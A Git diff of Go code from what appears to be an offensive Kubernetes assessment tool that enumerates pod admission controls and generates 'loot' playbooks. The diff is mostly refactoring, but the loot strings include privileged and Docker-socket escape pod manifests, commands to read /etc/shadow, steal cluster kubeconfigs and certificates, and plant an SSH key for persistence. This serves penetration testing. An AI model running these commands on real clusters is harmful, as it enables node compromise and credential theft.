+		loot.Section("pod-admission").Add("# 2. Check for namespace exclusions:")
+		loot.Section("pod-admission").Addf("kubectl get validatingwebhookconfiguration %s -o jsonpath='{.webhooks[*].namespaceSelector}'", datreeConfig.WebhookName)
+		loot.Section("pod-admission").Add("")
 	}
 
 	// Gatekeeper exclusions loot (if any exist)
 	if len(gatekeeperConfig.ExcludedNamespaces) > 0 {
-		loot.Section("Gatekeeper").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("Gatekeeper").Add("# [CRITICAL] NAMESPACE EXCLUSIONS - BYPASS VECTORS!")
-		loot.Section("Gatekeeper").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("Gatekeeper").Add("#")
-		loot.Section("Gatekeeper").Add("# The following namespaces are EXCLUDED from Gatekeeper constraints:")
+		loot.Section("pod-admission").Add("\n# ═══════════════════════════════════════════════════════════")
+		loot.Section("pod-admission").Add("# [CRITICAL] NAMESPACE EXCLUSIONS - BYPASS VECTORS!")
+		loot.Section("pod-admission").Add("# ═══════════════════════════════════════════════════════════")
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# The following namespaces are EXCLUDED from Gatekeeper constraints:")
 		for _, ns := range gatekeeperConfig.ExcludedNamespaces {
-			loot.Section("Gatekeeper").Addf("#   - %s", ns)
+			loot.Section("pod-admission").Addf("#   - %s", ns)
 		}
-		loot.Section("Gatekeeper").Add("#")
-		loot.Section("Gatekeeper").Add("# [ATTACK] Deploy privileged pods in excluded namespaces to bypass Gatekeeper!")
-		loot.Section("Gatekeeper").Add("")
-		loot.Section("Gatekeeper").Add("# Check Gatekeeper Config:")
-		loot.Section("Gatekeeper").Add("kubectl get config.config.gatekeeper.sh config -o yaml")
-		loot.Section("Gatekeeper").Add("")
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# [ATTACK] Deploy privileged pods in excluded namespaces to bypass Gatekeeper!")
+		loot.Section("pod-admission").Add("")
+		loot.Section("pod-admission").Add("# Check Gatekeeper Config:")
+		loot.Section("pod-admission").Add("kubectl get config.config.gatekeeper.sh config -o yaml")
+		loot.Section("pod-admission").Add("")
 	}
 
 	// Sort by namespace name
@@ -1859,6 +2491,7 @@ func ListPodAdmission(cmd *cobra.Command, args []string) {
 	})
 
 	// Build tables
+	// Always include: Summary + Unified Policies
 	tables := []internal.TableFile{
 		{
 			Name:   "Pod-Admission-Namespaces",
@@ -1867,85 +2500,160 @@ func ListPodAdmission(cmd *cobra.Command, args []string) {
 		},
 	}
 
-	// Add webhook table if webhooks exist
-	if len(webhookRows) > 0 {
+	// Add unified policies table if any policies exist
+	if len(unifiedPoliciesRows) > 0 {
 		tables = append(tables, internal.TableFile{
-			Name:   "Pod-Admission-Webhooks",
-			Header: webhookHeaders,
-			Body:   webhookRows,
+			Name:   "Pod-Admission-Policies",
+			Header: unifiedPoliciesHeaders,
+			Body:   unifiedPoliciesRows,
 		})
 	}
 
-	// Add PSP table if PSPs exist
-	if len(pspRows) > 0 {
-		tables = append(tables, internal.TableFile{
-			Name:   "Pod-Admission-PSP",
-			Header: pspHeaders,
-			Body:   pspRows,
-		})
-	}
+	// Detail tables - only with --detailed flag
+	if detailed {
+		// Add webhook table if webhooks exist
+		if len(webhookRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Pod-Admission-Webhooks",
+				Header: webhookHeaders,
+				Body:   webhookRows,
+			})
+		}
 
-	// Add VAP table if VAPs exist
-	if len(vapRows) > 0 {
-		tables = append(tables, internal.TableFile{
-			Name:   "Pod-Admission-VAP",
-			Header: vapHeaders,
-			Body:   vapRows,
-		})
-	}
+		// Add PSP table if PSPs exist
+		if len(pspRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Pod-Admission-PSP",
+				Header: pspHeaders,
+				Body:   pspRows,
+			})
+		}
 
-	// Add Gatekeeper table if constraints exist
-	if len(gatekeeperRows) > 0 {
-		tables = append(tables, internal.TableFile{
-			Name:   "Pod-Admission-Gatekeeper",
-			Header: gatekeeperHeaders,
-			Body:   gatekeeperRows,
-		})
-	}
+		// Add VAP table if VAPs exist
+		if len(vapRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Pod-Admission-VAP",
+				Header: vapHeaders,
+				Body:   vapRows,
+			})
+		}
 
-	// Add Kyverno table if policies exist
-	if len(kyvernoRows) > 0 {
-		tables = append(tables, internal.TableFile{
-			Name:   "Pod-Admission-Kyverno",
-			Header: kyvernoHeaders,
-			Body:   kyvernoRows,
-		})
-	}
+		// Add Gatekeeper table if constraints exist
+		if len(gatekeeperRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Pod-Admission-Gatekeeper",
+				Header: gatekeeperHeaders,
+				Body:   gatekeeperRows,
+			})
+		}
 
-	// Add Kyverno exceptions table if exceptions exist (bypass vectors!)
-	if len(kyvernoExceptionRows) > 0 {
-		tables = append(tables, internal.TableFile{
-			Name:   "Pod-Admission-Kyverno-Exceptions",
-			Header: kyvernoExceptionHeaders,
-			Body:   kyvernoExceptionRows,
-		})
-	}
+		// Add Kyverno table if policies exist
+		if len(kyvernoRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Pod-Admission-Kyverno",
+				Header: kyvernoHeaders,
+				Body:   kyvernoRows,
+			})
+		}
 
-	// Add Kubewarden table if policies exist
-	if len(kubewardenRows) > 0 {
-		tables = append(tables, internal.TableFile{
-			Name:   "Pod-Admission-Kubewarden",
-			Header: kubewardenHeaders,
-			Body:   kubewardenRows,
-		})
-	}
+		// Add Kyverno exceptions table if exceptions exist (bypass vectors!)
+		if len(kyvernoExceptionRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Pod-Admission-Kyverno-Exceptions",
+				Header: kyvernoExceptionHeaders,
+				Body:   kyvernoExceptionRows,
+			})
+		}
 
-	// Add jsPolicy table if policies exist
-	if len(jsPolicyRows) > 0 {
-		tables = append(tables, internal.TableFile{
-			Name:   "Pod-Admission-jsPolicy",
-			Header: jsPolicyHeaders,
-			Body:   jsPolicyRows,
-		})
-	}
+		// Add Kubewarden table if policies exist
+		if len(kubewardenRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Pod-Admission-Kubewarden",
+				Header: kubewardenHeaders,
+				Body:   kubewardenRows,
+			})
+		}
 
-	// Add Gatekeeper exclusions table if exclusions exist (bypass vectors!)
-	if len(gatekeeperExclusionRows) > 0 {
-		tables = append(tables, internal.TableFile{
-			Name:   "Pod-Admission-Gatekeeper-Exclusions",
-			Header: gatekeeperExclusionHeaders,
-			Body:   gatekeeperExclusionRows,
-		})
+		// Add jsPolicy table if policies exist
+		if len(jsPolicyRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Pod-Admission-jsPolicy",
+				Header: jsPolicyHeaders,
+				Body:   jsPolicyRows,
+			})
+		}
+
+		// Add Gatekeeper exclusions table if exclusions exist (bypass vectors!)
+		if len(gatekeeperExclusionRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Pod-Admission-Gatekeeper-Exclusions",
+				Header: gatekeeperExclusionHeaders,
+				Body:   gatekeeperExclusionRows,
+			})
+		}
+
+		// Add Polaris table if Polaris is configured
+		if len(polarisRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Pod-Admission-Polaris",
+				Header: polarisHeaders,
+				Body:   polarisRows,
+			})
+		}
+
+		// Add Datree table if Datree is configured
+		if len(datreeRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Pod-Admission-Datree",
+				Header: datreeHeaders,
+				Body:   datreeRows,
+			})
+		}
+
+		// Add AWS Pod Identity table if identities exist
+		if len(awsPodIdentityRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Pod-Admission-AWS-Pod-Identity",
+				Header: awsPodIdentityHeaders,
+				Body:   awsPodIdentityRows,
+			})
+		}
+
+		// Add GCP Workload Identity table if identities exist
+		if len(gcpWorkloadIdentityRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Pod-Admission-GCP-Workload-Identity",
+				Header: gcpWorkloadIdentityHeaders,
+				Body:   gcpWorkloadIdentityRows,
+			})
+		}
+
+		// Add Azure Workload Identity table if identities exist
+		if len(azureWorkloadIdentityRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Pod-Admission-Azure-Workload-Identity",
+				Header: azureWorkloadIdentityHeaders,
+				Body:   azureWorkloadIdentityRows,
+			})
+		}
+
+		// Add Capsule Tenant Pod Policy table if policies exist
+		if len(capsuleTenantPodRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Pod-Admission-Capsule-Tenant",
+				Header: capsuleTenantPodHeaders,
+				Body:   capsuleTenantPodRows,
+			})
+		}
+
+		// Add Rancher Project Pod Policy table if policies exist
+		if len(rancherProjectPodRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Pod-Admission-Rancher-Project",
+				Header: rancherProjectPodHeaders,
+				Body:   rancherProjectPodRows,
+			})
+		}
 	}
 
 	lootFiles := loot.Build()
@@ -1976,8 +2684,21 @@ func ListPodAdmission(cmd *cobra.Command, args []string) {
 		if finding.NoEnforcement || finding.PSSEnforceLevel == "privileged" {
 			noEnforcementCount++
 		}
-		if finding.WebhookBypassRisk == shared.RiskHigh {
-			webhookBypassCount++
+		// Count webhooks with Ignore failure policy
+		for _, wh := range finding.MutatingWebhooks {
+			if wh.FailurePolicy == "Ignore" {
+				webhookBypassCount++
+				break
+			}
+		}
+		if webhookBypassCount == noEnforcementCount {
+			continue
+		}
+		for _, wh := range finding.ValidatingWebhooks {
+			if wh.FailurePolicy == "Ignore" {
+				webhookBypassCount++
+				break
+			}
 		}
 	}
 
@@ -2032,27 +2753,23 @@ func analyzePodSecurityStandards(ns corev1.Namespace) PSSAnalysis {
 			fmt.Sprintf("Namespace is exempt from PSS: %s", exempt))
 	}
 
-	// Risk assessment
+	// Security assessment
 	if analysis.EnforceLevel == "" {
 		analysis.NoEnforcement = true
-		analysis.RiskLevel = shared.RiskCritical
 		analysis.SecurityIssues = append(analysis.SecurityIssues,
 			"No PSS enforcement - accepts all pod configurations")
 	} else {
 		switch analysis.EnforceLevel {
 		case "privileged":
 			analysis.WeakEnforcement = true
-			analysis.RiskLevel = shared.RiskCritical
 			analysis.SecurityIssues = append(analysis.SecurityIssues,
 				"PSS enforce level 'privileged' - no restrictions (equivalent to no enforcement)")
 		case "baseline":
-			analysis.RiskLevel = shared.RiskMedium
 			analysis.SecurityIssues = append(analysis.SecurityIssues,
 				"PSS baseline allows some risky configurations (hostNetwork with restrictions, unsafe sysctls)")
 		case "restricted":
-			analysis.RiskLevel = shared.RiskLow
+			// No security issues for restricted level
 		default:
-			analysis.RiskLevel = shared.RiskMedium
 			analysis.SecurityIssues = append(analysis.SecurityIssues,
 				fmt.Sprintf("Unknown PSS level: %s", analysis.EnforceLevel))
 		}
@@ -2080,7 +2797,6 @@ func analyzePSPs(ctx context.Context, dynClient dynamic.Interface) []PSPAnalysis
 	for _, psp := range pspList.Items {
 		analysis := PSPAnalysis{
 			Name:               psp.GetName(),
-			RiskLevel:          shared.RiskLow,
 			DeprecationWarning: "PSP is deprecated since Kubernetes 1.21 and removed in 1.25",
 		}
 
@@ -2092,7 +2808,6 @@ func analyzePSPs(ctx context.Context, dynClient dynamic.Interface) []PSPAnalysis
 		// Check privileged
 		if privileged, _, _ := unstructured.NestedBool(spec, "privileged"); privileged {
 			analysis.AllowsPrivileged = true
-			analysis.RiskLevel = shared.RiskCritical
 			analysis.SecurityIssues = append(analysis.SecurityIssues,
 				"Allows privileged containers (full node compromise)")
 		}
@@ -2100,9 +2815,6 @@ func analyzePSPs(ctx context.Context, dynClient dynamic.Interface) []PSPAnalysis
 		// Check hostNetwork
 		if hostNetwork, _, _ := unstructured.NestedBool(spec, "hostNetwork"); hostNetwork {
 			analysis.AllowsHostNetwork = true
-			if analysis.RiskLevel != shared.RiskCritical {
-				analysis.RiskLevel = shared.RiskHigh
-			}
 			analysis.SecurityIssues = append(analysis.SecurityIssues,
 				"Allows host network access (network sniffing, service impersonation)")
 		}
@@ -2110,9 +2822,6 @@ func analyzePSPs(ctx context.Context, dynClient dynamic.Interface) []PSPAnalysis
 		// Check hostPID
 		if hostPID, _, _ := unstructured.NestedBool(spec, "hostPID"); hostPID {
 			analysis.AllowsHostPID = true
-			if analysis.RiskLevel != shared.RiskCritical {
-				analysis.RiskLevel = shared.RiskHigh
-			}
 			analysis.SecurityIssues = append(analysis.SecurityIssues,
 				"Allows host PID namespace (process inspection, signal injection)")
 		}
@@ -2120,9 +2829,6 @@ func analyzePSPs(ctx context.Context, dynClient dynamic.Interface) []PSPAnalysis
 		// Check hostIPC
 		if hostIPC, _, _ := unstructured.NestedBool(spec, "hostIPC"); hostIPC {
 			analysis.AllowsHostIPC = true
-			if analysis.RiskLevel != shared.RiskCritical {
-				analysis.RiskLevel = shared.RiskHigh
-			}
 			analysis.SecurityIssues = append(analysis.SecurityIssues,
 				"Allows host IPC namespace (shared memory access)")
 		}
@@ -2141,14 +2847,12 @@ func analyzePSPs(ctx context.Context, dynClient dynamic.Interface) []PSPAnalysis
 		for _, cap := range caps {
 			if cap == "*" {
 				analysis.AllowedCapabilities = append(analysis.AllowedCapabilities, "ALL")
-				analysis.RiskLevel = shared.RiskCritical
 				analysis.SecurityIssues = append(analysis.SecurityIssues,
 					"Allows ALL capabilities (complete privilege escalation)")
 				break
 			}
 			if desc, exists := dangerousCaps[cap]; exists {
 				analysis.AllowedCapabilities = append(analysis.AllowedCapabilities, cap)
-				analysis.RiskLevel = shared.RiskCritical
 				analysis.SecurityIssues = append(analysis.SecurityIssues,
 					fmt.Sprintf("Allows dangerous capability %s: %s", cap, desc))
 			}
@@ -2163,7 +2867,6 @@ func analyzePSPs(ctx context.Context, dynClient dynamic.Interface) []PSPAnalysis
 					if pathPrefix, ok := hpMap["pathPrefix"].(string); ok {
 						analysis.AllowedHostPaths = append(analysis.AllowedHostPaths, pathPrefix)
 						if pathPrefix == "/" || strings.HasPrefix(pathPrefix, "/var/lib/kubelet") {
-							analysis.RiskLevel = shared.RiskCritical
 							analysis.SecurityIssues = append(analysis.SecurityIssues,
 								fmt.Sprintf("Allows dangerous hostPath: %s", pathPrefix))
 						}
@@ -2179,9 +2882,6 @@ func analyzePSPs(ctx context.Context, dynClient dynamic.Interface) []PSPAnalysis
 				analysis.RunAsUserRule = rule
 				if rule == "RunAsAny" {
 					analysis.AllowsRunAsRoot = true
-					if analysis.RiskLevel == shared.RiskLow {
-						analysis.RiskLevel = shared.RiskMedium
-					}
 					analysis.SecurityIssues = append(analysis.SecurityIssues,
 						"Allows running as any user including root")
 				}
@@ -2253,7 +2953,6 @@ func analyzeWebhooks(ctx context.Context, dynClient dynamic.Interface, resourceT
 			if failurePolicy, ok := wMap["failurePolicy"].(string); ok {
 				info.FailurePolicy = failurePolicy
 				if failurePolicy == "Ignore" {
-					info.BypassRisk = shared.RiskHigh
 					info.SecurityIssues = append(info.SecurityIssues,
 						"Failure policy 'Ignore' - webhook failures don't block pods")
 				}
@@ -3929,8 +4628,16 @@ func detectPolicyBypass(finding PodSecurityFinding) []string {
 		bypasses = append(bypasses, "PSS privileged level - effectively no restrictions")
 	}
 
-	if finding.WebhookBypassRisk == "HIGH" {
-		bypasses = append(bypasses, "Webhook has 'Ignore' failure policy - trigger failure to bypass")
+	// Check for webhooks with Ignore failure policy
+	for _, wh := range finding.MutatingWebhooks {
+		if wh.FailurePolicy == "Ignore" {
+			bypasses = append(bypasses, fmt.Sprintf("Webhook %s has 'Ignore' failure policy - trigger failure to bypass", wh.Name))
+		}
+	}
+	for _, wh := range finding.ValidatingWebhooks {
+		if wh.FailurePolicy == "Ignore" {
+			bypasses = append(bypasses, fmt.Sprintf("Webhook %s has 'Ignore' failure policy - trigger failure to bypass", wh.Name))
+		}
 	}
 
 	if finding.PSPEnabled {
@@ -3967,168 +4674,61 @@ func detectPolicyEscalationPaths(finding PodSecurityFinding, pspAnalyses []PSPAn
 	return paths
 }
 
-// calculatePolicyRiskScore calculates policy configuration risk score
-func calculatePolicyRiskScore(finding PodSecurityFinding) (string, int) {
-	score := 0
 
-	// No enforcement = CRITICAL
-	if finding.NoEnforcement {
-		return shared.RiskCritical, 100
-	}
-
-	// PSS privileged level = CRITICAL
-	if finding.PSSEnforceLevel == "privileged" {
-		return shared.RiskCritical, 95
-	}
-
-	// PSP allows privileged
-	if finding.PSPAllowsPrivileged {
-		score += 80
-	}
-
-	// PSP dangerous capabilities
-	if len(finding.PSPDangerousCaps) > 0 {
-		score += 60
-	}
-
-	// PSP allows hostPath
-	if finding.PSPAllowsHostPath {
-		score += 50
-	}
-
-	// Webhook bypass risk
-	if finding.WebhookBypassRisk == shared.RiskHigh {
-		score += 40
-	}
-
-	// Weak enforcement (baseline)
-	if finding.PSSEnforceLevel == "baseline" {
-		score += 30
-	}
-
-	// Policy gaps
-	score += len(finding.PolicyGaps) * 10
-
-	// Policy conflicts
-	score += len(finding.ConflictDetails) * 5
-
-	// Bypass techniques
-	score += len(finding.BypassTechniques) * 15
-
-	// PSP deprecation risk
-	if finding.PSPEnabled {
-		score += 20
-	}
-
-	// Determine risk level
-	if score >= shared.CriticalThreshold {
-		return shared.RiskCritical, score
-	} else if score >= shared.HighThreshold {
-		return shared.RiskHigh, score
-	} else if score >= shared.MediumThreshold {
-		return shared.RiskMedium, score
-	}
-	return shared.RiskLow, score
-}
-
-// generatePolicyRecommendations generates policy security recommendations
-func generatePolicyRecommendations(finding PodSecurityFinding) []string {
-	var recommendations []string
-
-	if finding.NoEnforcement {
-		recommendations = append(recommendations,
-			"CRITICAL: Enable Pod Security Standards with 'restricted' level",
-			"kubectl label namespace "+finding.Namespace+" pod-security.kubernetes.io/enforce=restricted")
-	}
-
-	if finding.PSSEnforceLevel == "privileged" {
-		recommendations = append(recommendations,
-			"Upgrade PSS enforce level from 'privileged' to 'baseline' or 'restricted'")
-	}
-
-	if finding.PSSEnforceLevel == "baseline" {
-		recommendations = append(recommendations,
-			"Consider upgrading PSS enforce level from 'baseline' to 'restricted' for stronger security")
-	}
-
-	if finding.PSPEnabled {
-		recommendations = append(recommendations,
-			"Migrate from deprecated PSP to Pod Security Standards",
-			"PSP will be removed in Kubernetes 1.25")
-	}
-
-	if finding.WebhookBypassRisk == "HIGH" {
-		recommendations = append(recommendations,
-			"Change webhook failurePolicy from 'Ignore' to 'Fail'",
-			"Ensure webhook has proper monitoring and alerting")
-	}
-
-	if len(finding.ConflictDetails) > 0 {
-		recommendations = append(recommendations,
-			"Resolve policy conflicts (PSS/PSP/webhooks)",
-			"Use single consistent policy framework")
-	}
-
-	if len(recommendations) == 0 {
-		recommendations = append(recommendations, "Policy configuration is secure")
-	}
-
-	return recommendations
-}
 
 // generatePolicyLoot generates loot content organized by technology
 func generatePolicyLoot(finding *PodSecurityFinding, loot *shared.LootBuilder) {
 	// PSS section - enumeration and analysis
-	loot.Section("PSS").Addf("\n# ─────────────────────────────────────────────────────────────")
-	loot.Section("PSS").Addf("# Namespace: %s", finding.Namespace)
-	loot.Section("PSS").Addf("# ─────────────────────────────────────────────────────────────")
-	loot.Section("PSS").Addf("kubectl get ns %s --show-labels", finding.Namespace)
-	loot.Section("PSS").Addf("kubectl get ns %s -o yaml", finding.Namespace)
+	loot.Section("pod-admission").Addf("\n# ─────────────────────────────────────────────────────────────")
+	loot.Section("pod-admission").Addf("# Namespace: %s", finding.Namespace)
+	loot.Section("pod-admission").Addf("# ─────────────────────────────────────────────────────────────")
+	loot.Section("pod-admission").Addf("kubectl get ns %s --show-labels", finding.Namespace)
+	loot.Section("pod-admission").Addf("kubectl get ns %s -o yaml", finding.Namespace)
 
 	if finding.PSSEnabled {
-		loot.Section("PSS").Add("#")
-		loot.Section("PSS").Addf("# PSS Enforce: %s", finding.PSSEnforceLevel)
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Addf("# PSS Enforce: %s", finding.PSSEnforceLevel)
 		if finding.PSSWarnLevel != "" {
-			loot.Section("PSS").Addf("# PSS Warn: %s", finding.PSSWarnLevel)
+			loot.Section("pod-admission").Addf("# PSS Warn: %s", finding.PSSWarnLevel)
 		}
 		if finding.PSSAuditLevel != "" {
-			loot.Section("PSS").Addf("# PSS Audit: %s", finding.PSSAuditLevel)
+			loot.Section("pod-admission").Addf("# PSS Audit: %s", finding.PSSAuditLevel)
 		}
 	}
 
 	// Add bypass info for weak/no enforcement
 	if finding.NoEnforcement {
-		loot.Section("PSS").Add("#")
-		loot.Section("PSS").Add("# [VULNERABLE] No PSS enforcement - accepts any pod configuration")
-		loot.Section("PSS").Add("# See Privileged-Pods loot file for container escape pod")
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# [VULNERABLE] No PSS enforcement - accepts any pod configuration")
+		loot.Section("pod-admission").Add("# See Privileged-Pods loot file for container escape pod")
 	} else if finding.PSSEnforceLevel == "privileged" {
-		loot.Section("PSS").Add("#")
-		loot.Section("PSS").Add("# [VULNERABLE] PSS level 'privileged' - effectively no restrictions")
-		loot.Section("PSS").Add("# See Privileged-Pods loot file for container escape pod")
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# [VULNERABLE] PSS level 'privileged' - effectively no restrictions")
+		loot.Section("pod-admission").Add("# See Privileged-Pods loot file for container escape pod")
 	} else if finding.PSSEnforceLevel == "baseline" {
-		loot.Section("PSS").Add("#")
-		loot.Section("PSS").Add("# [MEDIUM] PSS level 'baseline' - allows some risky configs")
-		loot.Section("PSS").Add("# Allowed: hostNetwork (with restrictions), hostPort, hostPath (no /), unsafe sysctls")
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# [MEDIUM] PSS level 'baseline' - allows some risky configs")
+		loot.Section("pod-admission").Add("# Allowed: hostNetwork (with restrictions), hostPort, hostPath (no /), unsafe sysctls")
 	}
-	loot.Section("PSS").Add("")
+	loot.Section("pod-admission").Add("")
 
 	// Privileged-Pods section - ready-to-use escape pods
 	if finding.NoEnforcement || finding.PSSEnforceLevel == "privileged" || finding.PSPAllowsPrivileged {
-		loot.Section("Privileged-Pods").Addf("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("Privileged-Pods").Addf("# Namespace: %s", finding.Namespace)
-		loot.Section("Privileged-Pods").Addf("# ═══════════════════════════════════════════════════════════")
+		loot.Section("pod-admission").Addf("\n# ═══════════════════════════════════════════════════════════")
+		loot.Section("pod-admission").Addf("# Namespace: %s", finding.Namespace)
+		loot.Section("pod-admission").Addf("# ═══════════════════════════════════════════════════════════")
 
 		if finding.NoEnforcement {
-			loot.Section("Privileged-Pods").Add("# Status: NO ENFORCEMENT - accepts any pod")
+			loot.Section("pod-admission").Add("# Status: NO ENFORCEMENT - accepts any pod")
 		} else if finding.PSSEnforceLevel == "privileged" {
-			loot.Section("Privileged-Pods").Add("# Status: PSS PRIVILEGED - allows all dangerous configs")
+			loot.Section("pod-admission").Add("# Status: PSS PRIVILEGED - allows all dangerous configs")
 		} else if finding.PSPAllowsPrivileged {
-			loot.Section("Privileged-Pods").Add("# Status: PSP ALLOWS PRIVILEGED")
+			loot.Section("pod-admission").Add("# Status: PSP ALLOWS PRIVILEGED")
 		}
 
-		loot.Section("Privileged-Pods").Add("#")
-		loot.Section("Privileged-Pods").Add("# OPTION 1: Full privileged pod with host filesystem")
-		loot.Section("Privileged-Pods").Addf(`cat <<'EOF' | kubectl apply -f -
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# OPTION 1: Full privileged pod with host filesystem")
+		loot.Section("pod-admission").Addf(`cat <<'EOF' | kubectl apply -f -
 apiVersion: v1
 kind: Pod
 metadata:
@@ -4153,9 +4753,9 @@ spec:
       path: /
 EOF`, finding.Namespace)
 
-		loot.Section("Privileged-Pods").Add("#")
-		loot.Section("Privileged-Pods").Add("# OPTION 2: Minimal escape pod (hostPath only)")
-		loot.Section("Privileged-Pods").Addf(`cat <<'EOF' | kubectl apply -f -
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# OPTION 2: Minimal escape pod (hostPath only)")
+		loot.Section("pod-admission").Addf(`cat <<'EOF' | kubectl apply -f -
 apiVersion: v1
 kind: Pod
 metadata:
@@ -4175,9 +4775,9 @@ spec:
       path: /
 EOF`, finding.Namespace)
 
-		loot.Section("Privileged-Pods").Add("#")
-		loot.Section("Privileged-Pods").Add("# OPTION 3: Docker socket escape")
-		loot.Section("Privileged-Pods").Addf(`cat <<'EOF' | kubectl apply -f -
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# OPTION 3: Docker socket escape")
+		loot.Section("pod-admission").Addf(`cat <<'EOF' | kubectl apply -f -
 apiVersion: v1
 kind: Pod
 metadata:
@@ -4197,45 +4797,45 @@ spec:
       path: /var/run/docker.sock
 EOF`, finding.Namespace)
 
-		loot.Section("Privileged-Pods").Add("#")
-		loot.Section("Privileged-Pods").Add("# ─────────────────────────────────────────────────────────────")
-		loot.Section("Privileged-Pods").Add("# EXPLOITATION COMMANDS")
-		loot.Section("Privileged-Pods").Add("# ─────────────────────────────────────────────────────────────")
-		loot.Section("Privileged-Pods").Add("#")
-		loot.Section("Privileged-Pods").Add("# Exec into privileged pod:")
-		loot.Section("Privileged-Pods").Addf("kubectl exec -it privileged-escape -n %s -- sh", finding.Namespace)
-		loot.Section("Privileged-Pods").Add("#")
-		loot.Section("Privileged-Pods").Add("# Inside container - access host filesystem:")
-		loot.Section("Privileged-Pods").Add("ls -la /host/")
-		loot.Section("Privileged-Pods").Add("cat /host/etc/shadow")
-		loot.Section("Privileged-Pods").Add("cat /host/etc/passwd")
-		loot.Section("Privileged-Pods").Add("#")
-		loot.Section("Privileged-Pods").Add("# Steal kubeconfig and certificates:")
-		loot.Section("Privileged-Pods").Add("cat /host/etc/kubernetes/admin.conf")
-		loot.Section("Privileged-Pods").Add("cat /host/var/lib/kubelet/kubeconfig")
-		loot.Section("Privileged-Pods").Add("ls -la /host/var/lib/kubelet/pki/")
-		loot.Section("Privileged-Pods").Add("#")
-		loot.Section("Privileged-Pods").Add("# Access etcd data (all cluster secrets):")
-		loot.Section("Privileged-Pods").Add("ls -la /host/var/lib/etcd/")
-		loot.Section("Privileged-Pods").Add("#")
-		loot.Section("Privileged-Pods").Add("# Container runtime escape:")
-		loot.Section("Privileged-Pods").Add("ls -la /host/var/run/docker.sock")
-		loot.Section("Privileged-Pods").Add("ls -la /host/var/run/containerd/containerd.sock")
-		loot.Section("Privileged-Pods").Add("#")
-		loot.Section("Privileged-Pods").Add("# Add SSH key for persistence:")
-		loot.Section("Privileged-Pods").Add("mkdir -p /host/root/.ssh")
-		loot.Section("Privileged-Pods").Add("echo 'ssh-rsa AAAA...your-key...' >> /host/root/.ssh/authorized_keys")
-		loot.Section("Privileged-Pods").Add("#")
-		loot.Section("Privileged-Pods").Add("# Docker socket escape (if using docker-escape pod):")
-		loot.Section("Privileged-Pods").Add("docker run -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh")
-		loot.Section("Privileged-Pods").Add("#")
-		loot.Section("Privileged-Pods").Add("# ─────────────────────────────────────────────────────────────")
-		loot.Section("Privileged-Pods").Add("# CLEANUP")
-		loot.Section("Privileged-Pods").Add("# ─────────────────────────────────────────────────────────────")
-		loot.Section("Privileged-Pods").Addf("kubectl delete pod privileged-escape -n %s", finding.Namespace)
-		loot.Section("Privileged-Pods").Addf("kubectl delete pod hostpath-escape -n %s", finding.Namespace)
-		loot.Section("Privileged-Pods").Addf("kubectl delete pod docker-escape -n %s", finding.Namespace)
-		loot.Section("Privileged-Pods").Add("")
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
+		loot.Section("pod-admission").Add("# EXPLOITATION COMMANDS")
+		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# Exec into privileged pod:")
+		loot.Section("pod-admission").Addf("kubectl exec -it privileged-escape -n %s -- sh", finding.Namespace)
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# Inside container - access host filesystem:")
+		loot.Section("pod-admission").Add("ls -la /host/")
+		loot.Section("pod-admission").Add("cat /host/etc/shadow")
+		loot.Section("pod-admission").Add("cat /host/etc/passwd")
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# Steal kubeconfig and certificates:")
+		loot.Section("pod-admission").Add("cat /host/etc/kubernetes/admin.conf")
+		loot.Section("pod-admission").Add("cat /host/var/lib/kubelet/kubeconfig")
+		loot.Section("pod-admission").Add("ls -la /host/var/lib/kubelet/pki/")
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# Access etcd data (all cluster secrets):")
+		loot.Section("pod-admission").Add("ls -la /host/var/lib/etcd/")
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# Container runtime escape:")
+		loot.Section("pod-admission").Add("ls -la /host/var/run/docker.sock")
+		loot.Section("pod-admission").Add("ls -la /host/var/run/containerd/containerd.sock")
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# Add SSH key for persistence:")
+		loot.Section("pod-admission").Add("mkdir -p /host/root/.ssh")
+		loot.Section("pod-admission").Add("echo 'ssh-rsa AAAA...your-key...' >> /host/root/.ssh/authorized_keys")
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# Docker socket escape (if using docker-escape pod):")
+		loot.Section("pod-admission").Add("docker run -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh")
